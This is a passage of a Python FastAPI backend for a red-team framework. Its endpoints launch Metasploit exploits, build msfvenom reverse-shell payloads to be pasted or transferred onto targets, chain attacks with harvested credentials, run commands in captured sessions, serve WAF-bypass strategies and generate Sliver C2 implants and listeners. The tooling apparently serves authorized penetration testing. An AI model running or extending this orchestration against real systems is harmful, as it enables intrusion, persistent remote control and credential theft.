            "ai_analysis": ai_analysis_data.get("analysis") if isinstance(ai_analysis_data, dict) else ai_analysis_data,
            "exploits": ai_analysis_data.get("exploits", []) if isinstance(ai_analysis_data, dict) else [],
            "attack_tree": scan.get("attack_tree"),
            "suggested_chains": scan.get("suggested_chains", []),
            "recommended_modules": scan.get("recommended_modules", []),
            "vault_summary": scan.get("vault", {}),
            "timeline": scan.get("timeline", []),
            "adaptive_log": [],
            "auto_triggered_chain": None
        }
    raise HTTPException(status_code=404, detail="Scan not found")

@api_router.get("/scan/{scan_id}/tree")
async def get_attack_tree(scan_id: str):
    if scan_id in attack_trees:
        return attack_trees[scan_id]
    scan = await repo.scan_get(scan_id)
    if scan and scan.get("attack_tree"):
        return scan["attack_tree"]
    raise HTTPException(status_code=404, detail="Tree not found")

@api_router.put("/scan/{scan_id}/tree/node/{node_id}")
async def update_tree_node(scan_id: str, node_id: str, update: UpdateNodeStatus):
    if scan_id not in attack_trees:
        scan = await repo.scan_get(scan_id)
        if scan and scan.get("attack_tree"):
            attack_trees[scan_id] = scan["attack_tree"]
        else:
            raise HTTPException(status_code=404, detail="Tree not found")
    tree = attack_trees[scan_id]
    if node_id in tree["nodes"]:
        tree["nodes"][node_id]["status"] = update.status
        await repo.scan_update(scan_id, attack_tree=tree)
    return {"message": "Updated", "status": update.status}

@api_router.post("/metasploit/execute")
async def execute_metasploit_endpoint(exploit: ExploitExecute):
    return await run_metasploit(exploit.module, exploit.target_host, exploit.target_port, exploit.options, exploit.lhost, exploit.lport)

@api_router.get("/metasploit/modules")
async def get_metasploit_modules(query: str = "", category: str = ""):
    modules = METASPLOIT_MODULES
    if category:
        modules = [m for m in modules if m["category"] == category]
    if query:
        modules = [m for m in modules if query.lower() in m["name"].lower() or query.lower() in m["desc"].lower()]
    return {"modules": modules}

@api_router.get("/scan/history")
async def get_scan_history():
    scans = await repo.scan_list(limit=100)
    return scans

@api_router.get("/scan/{scan_id}/report")
async def get_scan_report(scan_id: str):
    scan = await repo.scan_get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Not found")
    return {"report": scan}

@api_router.get("/scan/{scan_id}/report/pdf")
async def get_scan_report_pdf(scan_id: str):
    scan = await repo.scan_get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Not found")

    pdf = FPDF()
    pdf.set_auto_page_break(auto=True, margin=15)
    pdf.add_page()
    pdf.set_font("Courier", "B", 18)
    pdf.cell(0, 12, "RED TEAM - REPORTE DE OPERACION", ln=True, align="C")
    pdf.set_font("Courier", "", 10)
    pdf.cell(0, 8, f"Fecha: {scan.get('created_at', 'N/A')}", ln=True, align="C")
    pdf.cell(0, 8, f"Target: {scan.get('target', 'N/A')}", ln=True, align="C")
    pdf.line(10, pdf.get_y(), 200, pdf.get_y())
    pdf.ln(5)
    pdf.set_font("Courier", "B", 14)
    pdf.cell(0, 10, "QUE ENCONTRAMOS", ln=True)
    pdf.set_font("Courier", "", 10)
    pdf.cell(0, 7, f"Estado: {scan.get('status', 'unknown').upper()}", ln=True)
    results = scan.get("results", {})
    if results:
        pdf.set_font("Courier", "B", 12)
        pdf.cell(0, 10, "RESULTADOS POR HERRAMIENTA", ln=True)
        pdf.set_font("Courier", "", 9)
        for tool_name, tool_result in (results.items() if isinstance(results, dict) else []):
            pdf.set_font("Courier", "B", 10)
            pdf.cell(0, 8, f">>> {tool_name.upper()}", ln=True)
            pdf.set_font("Courier", "", 9)
            if isinstance(tool_result, dict):
                if tool_result.get("simulated"):
                    pdf.cell(0, 6, f"  [SIMULADO] {str(tool_result.get('command',''))[:80]}", ln=True)
                elif tool_result.get("ports"):
                    for p in tool_result["ports"][:15]:
                        pdf.cell(0, 6, f"  {p.get('port','?')} - {p.get('state','?')} - {p.get('service','?')}", ln=True)
                elif tool_result.get("vulnerabilities"):
                    for v in tool_result["vulnerabilities"][:10]:
                        pdf.cell(0, 6, sanitize_for_pdf(f"  [{v.get('severity','?')}] {v.get('finding', '')[:80]}"), ln=True)
            pdf.ln(2)
    pdf.ln(5)
    pdf.set_font("Courier", "I", 9)
    pdf.cell(0, 7, "Generado por Red Team Framework v6.0", ln=True, align="C")
    pdf_bytes = pdf.output()
    buffer = io.BytesIO(pdf_bytes)
    buffer.seek(0)
    filename = f"redteam-report-{scan.get('target','unknown')}-{scan_id[:8]}.pdf"
    return StreamingResponse(buffer, media_type="application/pdf", headers={"Content-Disposition": f"attachment; filename={filename}"})

@api_router.delete("/scan/{scan_id}")
async def delete_scan(scan_id: str):
    await repo.scan_delete(scan_id)
    scan_progress.pop(scan_id, None)
    attack_trees.pop(scan_id, None)
    return {"message": "Deleted"}


# ============ VAULT & TIMELINE ENDPOINTS ============

@api_router.get("/scan/{scan_id}/vault")
async def get_scan_vault(scan_id: str):
    summary = credential_vault.get_vault_summary(scan_id)
    creds = credential_vault.get_credentials(scan_id)
    safe_creds = []
    for c in creds:
        safe = {**c}
        if safe.get("value") and safe.get("type") == "plaintext":
            safe["value"] = safe["value"][:2] + "***" + safe["value"][-1:]
        safe_creds.append(safe)
    return {"summary": summary, "credentials": safe_creds, "context": credential_vault.get_context(scan_id)}

@api_router.get("/scan/{scan_id}/timeline")
async def get_scan_timeline(scan_id: str):
    if scan_id in scan_progress:
        return {"timeline": scan_progress[scan_id].get("timeline", []), "adaptive_log": scan_progress[scan_id].get("adaptive_log", [])}
    scan = await repo.scan_get(scan_id)
    if scan:
        return {"timeline": scan.get("timeline", []), "adaptive_log": []}
    raise HTTPException(status_code=404, detail="Not found")

@api_router.get("/scan/{scan_id}/sessions")
async def get_scan_sessions(scan_id: str):
    sessions = session_manager.get_sessions(scan_id)
    post_actions = session_manager.get_post_exploit_actions(scan_id)
    return {"sessions": sessions, "post_exploit_actions": post_actions}

@api_router.post("/scan/{scan_id}/abort")
async def abort_scan(scan_id: str):
    if scan_id in scan_progress and scan_progress[scan_id]["status"] == "running":
        scan_progress[scan_id]["status"] = "aborted"
        return {"status": "aborted", "scan_id": scan_id}
    raise HTTPException(status_code=400, detail="Scan not running")


# ============ MITRE & TACTICAL ============

@api_router.get("/mitre/tactics")
async def get_mitre_tactics():
    return {"tactics": MITRE_TACTICS}

@api_router.get("/tools")
async def get_tools(phase: str = None):
    tools = {k: v for k, v in RED_TEAM_TOOLS.items() if not phase or v["phase"] == phase}
    return {"tools": tools}

@api_router.get("/tactical/waf-bypass/{waf_name}")
async def get_waf_bypass_strategy(waf_name: str):
    waf_lower = waf_name.lower()
    for key, strategy in TacticalDecisionEngine.WAF_BYPASS_STRATEGIES.items():
        if key in waf_lower:
            return strategy
    return TacticalDecisionEngine.WAF_BYPASS_STRATEGIES["default"]

@api_router.get("/tactical/service-attacks")
async def get_service_attacks():
    return {"strategies": TacticalDecisionEngine.SERVICE_ATTACK_MAP}

@api_router.get("/tactical/vuln-exploits")
async def get_vuln_exploits():
    return {"mappings": TacticalDecisionEngine.VULN_EXPLOIT_MAP}


# ============ PAYLOAD ENDPOINTS ============

@api_router.get("/payloads/templates")
async def get_payload_templates():
    lhost = get_effective_lhost()
    lport = str(global_config.get("listener_port", 4444))
    templates = []
    for pid, pt in PAYLOAD_TEMPLATES.items():
        templates.append({
            "id": pid, "name": pt["name"], "platform": pt["platform"],
            "arch": pt["arch"], "type": pt["type"], "description": pt["description"],
            "generator_cmd": pt["generator"].format(lhost=lhost or "YOUR_IP", lport=lport, output=f"payload.{pt['output_ext'] or 'txt'}", platform=pt["platform"], arch=pt["arch"]),
            "handler_cmd": pt["handler"].format(lhost=lhost or "YOUR_IP", lport=lport),
            "lhost_configured": bool(lhost),
        })
    return {"payloads": templates, "global_lhost": lhost, "global_lport": lport}

@api_router.post("/payloads/generate")
async def generate_payload(data: Dict[str, Any]):
    payload_id = data.get("payload_id", "")
    template = PAYLOAD_TEMPLATES.get(payload_id)
    if not template:
        raise HTTPException(status_code=404, detail=f"Unknown payload: {payload_id}")
    lhost = data.get("lhost") or get_effective_lhost()
    lport = str(data.get("lport") or global_config.get("listener_port", 4444))
    platform = data.get("platform", template["platform"])
    arch = data.get("arch", template["arch"])
    output_name = data.get("output", f"payload_{payload_id.replace('/', '_')}.{template['output_ext'] or 'txt'}")
    if not lhost:
        raise HTTPException(status_code=400, detail="LHOST not configured.")
    generator_cmd = template["generator"].format(lhost=lhost, lport=lport, output=output_name, platform=platform, arch=arch)
    handler_cmd = template["handler"].format(lhost=lhost, lport=lport)
    result = {"payload_id": payload_id, "name": template["name"], "type": template["type"], "platform": platform, "arch": arch, "lhost": lhost, "lport": lport, "generator_cmd": generator_cmd, "handler_cmd": handler_cmd, "output_file": output_name if template["output_ext"] else None, "description": template["description"]}
    if template["type"] == "oneliner":
        result["payload_content"] = generator_cmd
        result["execution_method"] = "Copy and paste directly on target"
        return result
    if template["type"] in ("staged", "stageless"):
        try:
            output_path = f"/tmp/{output_name}"
            gen_result = subprocess.run(generator_cmd.split(), capture_output=True, text=True, timeout=120)
            if gen_result.returncode == 0 and os.path.exists(output_path):
                result["generated"] = True
                result["file_path"] = output_path
                result["file_size"] = os.path.getsize(output_path)
                result["execution_method"] = f"Transfer {output_name} to target. Start handler: {handler_cmd}"
            else:
                result["generated"] = False
                result["error"] = gen_result.stderr[:300] if gen_result.stderr else "Generation failed"
                result["execution_method"] = f"Run manually: {generator_cmd}"
        except FileNotFoundError:
            result["generated"] = False
            result["error"] = "msfvenom not found"
            result["execution_method"] = f"Run on Kali: {generator_cmd}"
        except Exception as e:
            result["generated"] = False
            result["error"] = str(e)
    elif template["type"] == "implant":
        result["generated"] = False
        result["execution_method"] = f"Run in Sliver console: {generator_cmd}"
    return result


# ============ ATTACK CHAINS API ============

@api_router.get("/chains")
async def get_attack_chains():
    chains = []
    for chain_id, chain in AttackChainEngine.ATTACK_CHAINS.items():
        chains.append({"id": chain_id, "name": chain["name"], "description": chain["description"], "triggers": chain["trigger"], "steps_count": len(chain["steps"])})
    return {"chains": chains}

@api_router.get("/chains/{chain_id}")
async def get_chain_details(chain_id: str):
    chain = AttackChainEngine.get_chain_details(chain_id)
    if not chain:
        raise HTTPException(status_code=404, detail="Chain not found")
    return chain

@api_router.post("/chains/{chain_id}/generate")
async def generate_chain_commands(chain_id: str, context: Dict[str, Any]):
    effective_lhost = context.get("lhost", "") or get_effective_lhost()
    effective_lport = context.get("lport", "") or str(global_config.get("listener_port", 4444))
    full_context = {**context, "lhost": effective_lhost, "lport": effective_lport}
    commands = AttackChainEngine.generate_chain_commands(chain_id, full_context)
    if not commands:
        raise HTTPException(status_code=404, detail="Chain not found")
    return {"chain_id": chain_id, "commands": commands}

@api_router.post("/chains/detect")
async def detect_applicable_chains(findings: Dict[str, Any]):
    applicable = AttackChainEngine.get_applicable_chains(findings)
    return {"applicable_chains": applicable, "count": len(applicable)}

@api_router.post("/chains/execute")
async def execute_chain(request: ChainExecutionRequest, background_tasks: BackgroundTasks):
    chain = AttackChainEngine.get_chain_details(request.chain_id)
    if not chain:
        raise HTTPException(status_code=404, detail="Chain not found")
    execution_id = str(uuid.uuid4())
    effective_lhost = request.context.get("lhost", "") or get_effective_lhost()
    context = {**request.context, "target": request.target, "lhost": effective_lhost}
    commands = AttackChainEngine.generate_chain_commands(request.chain_id, context)
    step_statuses = {}
    for cmd in commands:
        step_statuses[str(cmd["step_id"])] = {"step_id": cmd["step_id"], "step_name": cmd["step_name"], "status": "pending", "command_results": []}
    active_chains[execution_id] = {
        "id": execution_id, "scan_id": request.scan_id, "chain_id": request.chain_id,
        "chain_name": chain["name"], "target": request.target, "status": "ready",
        "current_step": 0, "total_steps": len(commands), "progress": 0,
        "commands": commands, "step_statuses": step_statuses, "results": [],
        "created_at": datetime.now(timezone.utc).isoformat(), "context": context
    }
    # Persist to SQLite
    await repo.chain_exec_create(execution_id, request.chain_id, chain["name"], request.scan_id, request.target, commands, step_statuses, len(commands), context)
    if request.auto_execute:
        active_chains[execution_id]["status"] = "running"
        background_tasks.add_task(run_chain_background, execution_id)
    return {"execution_id": execution_id, "chain_id": request.chain_id, "chain_name": chain["name"], "status": active_chains[execution_id]["status"], "total_steps": len(commands), "step_statuses": step_statuses, "commands": commands}

async def run_chain_background(execution_id: str):
    chain_exec = active_chains.get(execution_id)
    if not chain_exec:
        return
    scan_id = chain_exec.get("scan_id")
    target = chain_exec["target"]
    for step in chain_exec["commands"]:
        if chain_exec["status"] != "running":
            break
        chain_exec["current_step"] = step["step_id"]
        chain_exec["progress"] = int((step["step_id"] - 1) / chain_exec["total_steps"] * 100)
        step_status = {"step_id": step["step_id"], "step_name": step["step_name"], "status": "running", "started_at": datetime.now(timezone.utc).isoformat(), "command_results": []}
        chain_exec["step_statuses"][str(step["step_id"])] = step_status
        condition_met = True
        for cmd in step["commands"]:
            condition = cmd.get("condition", "")
            if condition:
                results = scan_progress.get(scan_id, {}).get("results", {})
                results_text = json.dumps(results).lower()
                if condition == "sqli" and "sql injection" not in results_text:
                    condition_met = False
                elif condition == "shell" and not session_manager.has_active(scan_id):
                    condition_met = False
                elif condition == "linux" and (credential_vault.get_context(scan_id) or {}).get("os_info", {}).get("os") != "linux":
                    condition_met = False
                elif condition == "windows" and (credential_vault.get_context(scan_id) or {}).get("os_info", {}).get("os") != "windows":
                    condition_met = False
        if not condition_met:
            step_status["status"] = "skipped"
            step_status["completed_at"] = datetime.now(timezone.utc).isoformat()
            chain_exec["results"].append(step_status)
            await asyncio.sleep(0.2)
            continue
        step_success = True
        for cmd in step["commands"]:
            try:
                command_str = cmd.get("command", "")
                if scan_id:
                    command_str = credential_vault.inject_context(command_str, scan_id, target, chain_exec.get("context", {}))
                if cmd.get("module"):
                    result = await run_metasploit(cmd["module"], target, None, {}, chain_exec.get("context", {}).get("lhost"), 4444)
                    if result.get("session_opened") and scan_id:
                        session_manager.register(scan_id, {"id": f"chain_{execution_id}_{step['step_id']}", "host": target, "type": "shell", "source": cmd["module"]})
                else:
                    await asyncio.sleep(1)
                    result = {"command": command_str, "tool": cmd.get("tool", "shell"), "simulated": True, "success": True, "output": f"[SIM] Executed: {command_str[:120]}"}
                step_status["command_results"].append(result)
            except Exception as e:
                step_status["command_results"].append({"error": str(e), "success": False})
                step_success = False
        step_status["status"] = "completed" if step_success else "failed"
        step_status["completed_at"] = datetime.now(timezone.utc).isoformat()
        chain_exec["results"].append(step_status)
        await asyncio.sleep(0.5)
    chain_exec["status"] = "completed"
    chain_exec["progress"] = 100
    chain_exec["completed_at"] = datetime.now(timezone.utc).isoformat()
    if scan_id:
        chain_exec["vault_summary"] = credential_vault.get_vault_summary(scan_id)
        await credential_vault.save_to_db(scan_id)
    # Persist to SQLite
    await repo.chain_exec_update(execution_id, status="completed", progress=100, results=chain_exec["results"], step_statuses=chain_exec["step_statuses"], vault_summary=chain_exec.get("vault_summary"), completed_at=chain_exec["completed_at"])

@api_router.get("/chains/execution/{execution_id}")
async def get_chain_execution_status(execution_id: str):
    if execution_id in active_chains:
        chain = active_chains[execution_id]
        return {"id": chain["id"], "chain_id": chain["chain_id"], "chain_name": chain["chain_name"], "target": chain["target"], "status": chain["status"], "current_step": chain["current_step"], "total_steps": chain["total_steps"], "progress": chain.get("progress", 0), "step_statuses": chain.get("step_statuses", {}), "results": chain.get("results", []), "created_at": chain.get("created_at"), "completed_at": chain.get("completed_at")}
    exec_doc = await repo.chain_exec_get(execution_id)
    if exec_doc:
        return exec_doc
    raise HTTPException(status_code=404, detail="Execution not found")

@api_router.post("/chains/execution/{execution_id}/step/{step_id}")
async def execute_chain_step(execution_id: str, step_id: int):
    chain_exec = active_chains.get(execution_id)
    if not chain_exec:
        raise HTTPException(status_code=404, detail="Execution not found")
    step = None
    for s in chain_exec["commands"]:
        if s["step_id"] == step_id:
            step = s
            break
    if not step:
        raise HTTPException(status_code=404, detail="Step not found")
    if "step_statuses" not in chain_exec:
        chain_exec["step_statuses"] = {}
    chain_exec["step_statuses"][str(step_id)] = {"step_id": step_id, "step_name": step["step_name"], "status": "running", "started_at": datetime.now(timezone.utc).isoformat(), "command_results": []}
    step_results = chain_exec["step_statuses"][str(step_id)]
    step_success = True
    for cmd in step["commands"]:
        try:
            if cmd.get("module"):
                result = await run_metasploit(cmd["module"], chain_exec["target"], None, {}, None, 4444)
            else:
                result = {"command": cmd["command"], "tool": cmd.get("tool", "shell"), "simulated": True, "success": True, "output": f"[SIM] Executed: {cmd['command'][:120]}"}
            step_results["command_results"].append(result)
        except Exception as e:
            step_results["command_results"].append({"error": str(e), "success": False})
            step_success = False
    step_results["status"] = "completed" if step_success else "failed"
    step_results["completed_at"] = datetime.now(timezone.utc).isoformat()
    chain_exec["results"].append(step_results)
    chain_exec["current_step"] = step_id
    completed_steps = sum(1 for s in chain_exec.get("step_statuses", {}).values() if s.get("status") in ["completed", "failed"])
    chain_exec["progress"] = int((completed_steps / chain_exec["total_steps"]) * 100)
    if completed_steps >= chain_exec["total_steps"]:
        chain_exec["status"] = "completed"
        chain_exec["completed_at"] = datetime.now(timezone.utc).isoformat()
    return step_results


# ============ DYNAMIC TOOL CATALOG ============

@api_router.post("/tools/add")
async def add_custom_tool(data: Dict[str, Any]):
    tool_id = data.get("id", "").lower().replace(" ", "_")
    if not tool_id or not data.get("cmd"):
        raise HTTPException(status_code=400, detail="id and cmd required")
    RED_TEAM_TOOLS[tool_id] = {"phase": data.get("phase", "reconnaissance"), "mitre": data.get("mitre", ""), "cmd": data.get("cmd"), "desc": data.get("desc", "Custom tool")}
    await repo.custom_tool_upsert(tool_id, data.get("phase", "reconnaissance"), data.get("mitre", ""), data.get("cmd"), data.get("desc", "Custom tool"))
    return {"status": "added", "tool": RED_TEAM_TOOLS[tool_id]}

@api_router.delete("/tools/{tool_id}")
async def remove_custom_tool(tool_id: str):
    if tool_id in RED_TEAM_TOOLS:
        del RED_TEAM_TOOLS[tool_id]
        await repo.custom_tool_delete(tool_id)
        return {"status": "removed", "tool_id": tool_id}
    raise HTTPException(status_code=404, detail="Tool not found")

@api_router.post("/metasploit/modules/add")
async def add_custom_msf_module(data: Dict[str, Any]):
    if not data.get("name"):
        raise HTTPException(status_code=400, detail="name required")
    module = {"name": data["name"], "desc": data.get("desc", ""), "rank": data.get("rank", "normal"), "category": data.get("category", "exploit"), "mitre": data.get("mitre", "")}
    METASPLOIT_MODULES.append(module)
    await repo.custom_module_upsert(module["name"], module["desc"], module["rank"], module["category"], module["mitre"])
    return {"status": "added", "module": module}


# ============ WEBSOCKET REAL-TIME UPDATES ============

@api_router.websocket("/ws/scan/{scan_id}")
async def websocket_scan(websocket: WebSocket, scan_id: str):
    await websocket.accept()
    if scan_id not in active_connections:
        active_connections[scan_id] = []
    active_connections[scan_id].append(websocket)
    try:
        while True:
            if scan_id in scan_progress:
                p = scan_progress[scan_id]
                await websocket.send_json({
                    "type": "scan_update", "scan_id": scan_id, "status": p["status"],
                    "progress": p["progress"], "current_tool": p["current_tool"],
                    "results": p["results"],
                    "tactical_decisions": p.get("tactical_decisions", []),
                    "suggested_chains": p.get("suggested_chains", []),
                    "recommended_modules": p.get("recommended_modules", [])
                })
                if p["status"] in ["completed", "error"]:
                    break
            await asyncio.sleep(1)
    except Exception:
        pass
    finally:
        if scan_id in active_connections and websocket in active_connections[scan_id]:
            active_connections[scan_id].remove(websocket)
        try:
            await websocket.close()
        except Exception:
            pass

@api_router.websocket("/ws/chain/{execution_id}")
async def websocket_chain(websocket: WebSocket, execution_id: str):
    await websocket.accept()
    try:
        while True:
            if execution_id in active_chains:
                chain = active_chains[execution_id]
                await websocket.send_json({
                    "type": "chain_update", "id": chain["id"], "chain_id": chain["chain_id"],
                    "chain_name": chain["chain_name"], "status": chain["status"],
                    "current_step": chain["current_step"], "total_steps": chain["total_steps"],
                    "progress": chain.get("progress", 0), "step_statuses": chain.get("step_statuses", {}),
                    "results": chain.get("results", [])
                })
                if chain["status"] in ["completed", "error"]:
                    break
            else:
                await websocket.send_json({"type": "chain_not_found", "id": execution_id})
                break
            await asyncio.sleep(1)
    except Exception:
        pass
    finally:
        try:
            await websocket.close()
        except Exception:
            pass


# ============ METASPLOIT RPC ENDPOINTS ============

import modules as msf_module
import modules.sliver_c2 as sliver_module

@api_router.get("/msf/status")
async def msf_rpc_status():
    try:
        return await asyncio.wait_for(
            asyncio.get_event_loop().run_in_executor(None, lambda: msf_module.get_msf_status(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT)),
            timeout=5
        )
    except (asyncio.TimeoutError, Exception) as e:
        return {"connected": False, "error": f"Timeout: {e}"}

@api_router.post("/msf/connect")
async def msf_rpc_connect():
    msf_module.disconnect_msf()
    try:
        return await asyncio.wait_for(
            asyncio.get_event_loop().run_in_executor(None, lambda: msf_module.get_msf_status(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT)),
            timeout=8
        )
    except (asyncio.TimeoutError, Exception) as e:
        return {"connected": False, "error": f"Timeout: {e}"}

@api_router.get("/msf/diagnostics")
async def msf_diagnostics():
    return msf_module.get_connection_detail()

@api_router.get("/msf/search")
async def msf_rpc_search(query: str = "", module_type: str = ""):
    if not msf_module.is_connected():
        return {"modules": [], "source": "static", "hint": "msfrpcd not connected"}
    modules = msf_module.search_modules(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT, query, module_type)
    return {"modules": modules, "source": "msfrpcd", "count": len(modules)}

@api_router.get("/msf/module/info")
async def msf_rpc_module_info(module_type: str, module_name: str):
    return msf_module.get_module_info(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT, module_type, module_name)

@api_router.post("/msf/module/execute")
async def msf_rpc_execute(data: Dict[str, Any]):
    return msf_module.execute_module(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT, data.get("module_type", "exploit"), data.get("module_name", ""), data.get("options", {}))

@api_router.get("/msf/sessions")
async def msf_rpc_sessions():
    sessions = msf_module.list_sessions(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT)
    return {"sessions": sessions, "count": len(sessions)}

@api_router.post("/msf/session/command")
async def msf_rpc_session_command(data: Dict[str, Any]):
    return msf_module.session_command(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT, data.get("session_id", ""), data.get("command", ""))

@api_router.get("/msf/jobs")
async def msf_rpc_jobs():
    msf_jobs = msf_module.list_jobs(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT)
    return {"jobs": msf_jobs, "count": len(msf_jobs)}

@api_router.post("/msf/job/kill")
async def msf_rpc_kill_job(data: Dict[str, Any]):
    return msf_module.kill_job(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT, data.get("job_id", ""))


# ============ SLIVER C2 ENDPOINTS ============

@api_router.get("/sliver/status")
async def sliver_status():
    return await sliver_module.get_status(SLIVER_CONFIG_PATH)

@api_router.get("/sliver/sessions")
async def sliver_sessions():
    sessions = await sliver_module.list_sessions(SLIVER_CONFIG_PATH)
    return {"sessions": sessions, "count": len(sessions)}

@api_router.get("/sliver/beacons")
async def sliver_beacons():
    beacons = await sliver_module.list_beacons(SLIVER_CONFIG_PATH)
    return {"beacons": beacons, "count": len(beacons)}

@api_router.get("/sliver/implants")
async def sliver_implants():
    implants = await sliver_module.list_implants(SLIVER_CONFIG_PATH)
    return {"implants": implants, "count": len(implants)}

@api_router.post("/sliver/implant/generate")
async def sliver_generate_implant(data: Dict[str, Any]):
    effective_lhost = data.get("lhost") or get_effective_lhost() or "127.0.0.1"
    effective_lport = data.get("lport") or global_config.get("listener_port", 443)
    return await sliver_module.generate_implant(SLIVER_CONFIG_PATH, name=data.get("name", "implant"), lhost=effective_lhost, lport=effective_lport, os_target=data.get("os", "linux"), arch=data.get("arch", "amd64"), implant_type=data.get("type", "session"), format_type=data.get("format", "executable"))

@api_router.post("/sliver/session/exec")
async def sliver_session_exec(data: Dict[str, Any]):
    return await sliver_module.session_exec(SLIVER_CONFIG_PATH, data.get("session_id", ""), data.get("command", ""))

@api_router.post("/sliver/listener/start")
async def sliver_start_listener(data: Dict[str, Any]):
    return await sliver_module.start_listener(SLIVER_CONFIG_PATH, lhost=data.get("lhost", "0.0.0.0"), lport=data.get("lport", 443), protocol=data.get("protocol", "mtls"))

@api_router.post("/sliver/reconnect")
async def sliver_reconnect():
    sliver_module._sliver_client = None
    sliver_module._sliver_connected = False
    sliver_module._sliver_retry_count = 0
    return await sliver_module.get_status(SLIVER_CONFIG_PATH)

@api_router.post("/c2/reconnect")
async def c2_reconnect_all():
    msf_module.disconnect_msf()
    sliver_module._sliver_client = None
    sliver_module._sliver_connected = False
    sliver_module._sliver_retry_count = 0
    msf_status = msf_module.get_msf_status(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT)
    sliver_stat = await sliver_module.get_status(SLIVER_CONFIG_PATH)
    return {"metasploit": msf_status, "sliver": sliver_stat}

@api_router.get("/c2/dashboard")
async def c2_dashboard():
    try:
        msf_status = await asyncio.wait_for(
            asyncio.get_event_loop().run_in_executor(None, lambda: msf_module.get_msf_status(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT)),
            timeout=5
        )
    except (asyncio.TimeoutError, Exception):
        msf_status = {"connected": False, "error": "Timeout connecting to msfrpcd"}
    try:
        sliver_stat = await asyncio.wait_for(sliver_module.get_status(SLIVER_CONFIG_PATH), timeout=5)
    except (asyncio.TimeoutError, Exception):
        sliver_stat = {"connected": False, "error": "Timeout connecting to Sliver"}
    msf_sessions = msf_module.list_sessions(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT) if msf_status.get("connected") else []
    msf_jobs_list = msf_module.list_jobs(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT) if msf_status.get("connected") else []
    sliver_sess = await sliver_module.list_sessions(SLIVER_CONFIG_PATH) if sliver_stat.get("connected") else []
    sliver_bcn = await sliver_module.list_beacons(SLIVER_CONFIG_PATH) if sliver_stat.get("connected") else []
    return {
        "metasploit": {**msf_status, "sessions": msf_sessions, "session_count": len(msf_sessions), "jobs": msf_jobs_list, "job_count": len(msf_jobs_list)},
        "sliver": {**sliver_stat, "sessions": sliver_sess, "session_count": len(sliver_sess), "beacons": sliver_bcn, "beacon_count": len(sliver_bcn)}
    }


# =============================================================================
# STARTUP / SHUTDOWN
# =============================================================================
app.include_router(api_router)
app.add_middleware(CORSMiddleware, allow_credentials=True, allow_origins=config.cors_origins.split(','), allow_methods=["*"], allow_headers=["*"])

@app.on_event("startup")
async def startup():
    logger.info(f"Initializing SQLite database: {config.db_path}")
    await repo.init(config.db_path)
    await load_global_config()
    # Load custom tools from DB
    custom_tools = await repo.custom_tools_list()
    for t in custom_tools:
        RED_TEAM_TOOLS[t["id"]] = {"phase": t.get("phase", ""), "mitre": t.get("mitre", ""), "cmd": t.get("cmd", ""), "desc": t.get("description", "")}
    custom_mods = await repo.custom_modules_list()
    for m in custom_mods:
        METASPLOIT_MODULES.append({"name": m["name"], "desc": m.get("description", ""), "rank": m.get("rank", "normal"), "category": m.get("category", "exploit"), "mitre": m.get("mitre", "")})
    logger.info(f"Red Team Framework v6.0 started [mode={config.app_mode}, db={config.db_path}]")
    if config.warnings:
        for w in config.warnings:
            logger.warning(f"Config: {w}")

@app.on_event("shutdown")
async def shutdown():
    logger.info("Shutting down...")
    await jobs.cleanup()
    await repo.close()
